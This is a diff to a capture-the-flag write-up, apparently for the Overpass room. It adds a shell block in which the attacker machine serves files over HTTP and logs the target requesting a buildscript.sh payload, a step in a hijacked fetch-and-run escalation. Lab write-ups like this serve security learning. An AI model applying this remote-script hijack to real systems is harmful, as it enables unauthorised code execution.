@@ -751,7 +751,13 @@ james@ip-10-66-180-249:~$
 
 Check the **python server** on the attacker machine for the request from the target.
 
-
+```shell
+┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
+└─$ python3 -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.66.180.249 - - [03/Dec/2025 06:42:00] code 404, message File not found
+10.66.180.249 - - [03/Dec/2025 06:42:00] "GET /downloads/src/buildscript.sh HTTP/1.1" 404 -
+```
 
 
 <div align="center">
